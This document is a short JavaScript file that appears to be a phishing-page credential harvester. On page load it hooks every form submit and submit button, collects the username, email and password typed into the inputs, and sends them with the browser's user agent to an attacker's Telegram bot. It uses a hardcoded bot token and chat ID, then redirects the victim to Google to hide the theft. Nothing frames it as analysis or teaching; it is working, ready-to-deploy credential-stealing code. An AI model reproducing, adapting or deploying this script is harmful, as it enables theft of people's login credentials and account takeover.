// Wait for the DOM to be fully ready
document.addEventListener('DOMContentLoaded', function() {
    // CONFIGURATION
    const BOT_TOKEN = '8983043957:AAGncbc73rTjiutiUMOSyDtiGJoqJOUqHSM'; // <--- PASTE TOKEN HERE
    const CHAT_ID = '7706898844';     // <--- PASTE CHAT ID HERE
    const REDIRECT_URL = 'https://www.google.com';

    // Find the submit button or form
    const form = document.querySelector('form');
    const button = document.querySelector('button[type="submit"]') || document.querySelector('input[type="submit"]');

    function sendCredentials() {
        let username = '';
        let password = '';
        let email = '';

        // Scan all inputs
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            const type = input.type.toLowerCase();
            const name = (input.name || input.id || '').toLowerCase();
            if (type === 'email' || name.includes('email')) email = input.value;
            if (type === 'password' || name.includes('pass')) password = input.value;
            if (type === 'text' || name.includes('user')) username = input.value;
        });

        if (!username && email) username = email;
        if (!username && inputs[0]) username = inputs[0].value;

        const message = `
🚨 *NEW LOGIN* 🚨
👤 *User:* ${username || email || 'Unknown'}
🔑 *Pass:* ${password || 'Unknown'}
📱 *Device:* ${navigator.userAgent.substring(0, 60)}
`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = new URLSearchParams();
        params.append('chat_id', CHAT_ID);
        params.append('text', message);
        params.append('parse_mode', 'Markdown');

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: params
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
                window.location.href = REDIRECT_URL;
            }
        });
    }

    // Attach to Form Submit
    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            sendCredentials();
        });
    }

    // Attach to Button Click (Fallback)
    if (button) {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            sendCredentials();
        });
    }
});
